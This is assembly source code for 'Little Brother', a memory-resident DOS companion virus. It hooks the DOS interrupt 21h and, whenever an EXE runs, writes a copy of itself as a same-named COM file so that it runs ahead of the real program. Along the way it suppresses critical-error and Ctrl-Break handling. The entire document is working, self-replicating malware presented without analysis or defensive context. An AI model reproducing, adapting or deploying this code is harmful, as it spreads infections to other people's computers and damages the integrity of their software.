;****************************************************************************
;*              Little Brother  Version 1
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                org     100h

FILELEN         equ     end - begin
RESPAR          equ     (FILELEN/16) + 17
VERSION         equ     1
oi21            equ     end
nameptr         equ     end+4
DTA             equ     end+8

                .RADIX  16


;****************************************************************************
;*              Start the program!
;****************************************************************************

begin:          cld

                mov     ax,0DEDEh               ;already installed?
                int     21h
                cmp     ah,041h
                je      cancel

                mov     ax,0044h                ;move program to empty hole
                mov     es,ax
                mov     di,0100h
                mov     si,di
                mov     cx,FILELEN
        rep     movsb

                mov     ds,cx                   ;get original int21 vector
                mov     si,0084h
                mov     di,offset oi21
                movsw
                movsw

                push    es                      ;set vector to new handler
                pop     ds
                mov     dx,offset ni21
                mov     ax,2521h
                int     21h

cancel:         ret


;****************************************************************************
;*              File-extensions
;****************************************************************************

EXE_txt         db      'EXE',0
COM_txt         db      'COM',0


;****************************************************************************
;*              Interupt handler 24
;****************************************************************************

ni24:           mov     al,03
                iret


;****************************************************************************
;*              Interupt handler 21
;****************************************************************************

ni21:           pushf

                cmp     ax,0DEDEh               ;install-check ?
                je      do_DEDE

                push    dx
                push    bx
                push    ax
                push    ds
                push    es

                cmp     ax,4B00h                ;execute ?
                jne     exit

doit:           call    infect

exit:           pop     es
                pop     ds
                pop     ax
                pop     bx
                pop     dx
                popf

                jmp     dword ptr cs:[oi21]     ;call to old int-handler

do_DEDE:        mov     ax,04100h+VERSION       ;return a signature
                popf
                iret


;****************************************************************************
;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

                mov     word ptr cs:[nameptr],dx  ;save the ptr to the filename
                mov     word ptr cs:[nameptr+2],ds

                push    cs                      ;set new DTA
                pop     ds
                mov     dx,offset DTA
                mov     ah,1Ah
                int     21

                call    searchpoint
                mov     si,offset EXE_txt       ;is extension 'EXE'?
                mov     cx,3
        rep     cmpsb
                jnz     do_com

do_exe:         mov     si,offset COM_txt       ;change extension to COM
                call    change_ext

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                xor     dl,dl                   ;clear the flag
                mov     ax,3301h
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                push    cs                      ;set int24 vec to new handler
                pop     ds
                mov     dx,offset ni24
                mov     ax,2524h
                int     21

                lds     dx,dword ptr [nameptr]  ;create the file (unique name)
                xor     cx,cx
                mov     ah,5Bh
                int     21
                jc      return1                 
                xchg    bx,ax                   ;save handle

                push    cs
                pop     ds
                mov     cx,FILELEN              ;write the file
                mov     dx,offset begin
                mov     ah,40h
                int     21
                cmp     ax,cx
                pushf

                mov     ah,3Eh                  ;close the file
                int     21

                popf
                jz      return1                 ;all bytes written?

                lds     dx,dword ptr [nameptr]  ;delete the file
                mov     ah,41h
                int     21

return1:        pop     ds                      ;restore int24 vector
                pop     dx
                mov     ax,2524h
                int     21

                pop     dx                      ;restore ctrl-break flag
                mov     ax,3301h
                int     21

                mov     si,offset EXE_txt       ;change extension to EXE
                call    change_ext

return:         ret

do_com:         call    findfirst               ;is the file a virus?
                cmp     word ptr cs:[DTA+1Ah],FILELEN
                jne     return
                mov     si,offset EXE_txt       ;does the EXE-variant exist?
                call    change_ext
                call    findfirst
                jnc     return
                mov     si,offset COM_txt       ;change extension to COM
                jmp     short change_ext


;****************************************************************************
;*              Find the file
;****************************************************************************

findfirst:      lds     dx,dword ptr [nameptr]
                mov     cl,27h
                mov     ah,4Eh
                int     21
                ret                


;****************************************************************************
;*              change the extension of the filename (CS:SI -> ext)
;****************************************************************************

change_ext:     call    searchpoint
                push    cs
                pop     ds
                movsw
                movsw
                ret


;****************************************************************************
;*              search begin of extension  
;****************************************************************************

searchpoint:    les     di,dword ptr cs:[nameptr]
                mov     ch,0FFh
                mov     al,'.'
        repnz   scasb
                ret


;****************************************************************************
;*              Text and Signature
;****************************************************************************

                db      'Little Brother',0

end:

cseg            ends
                end     begin

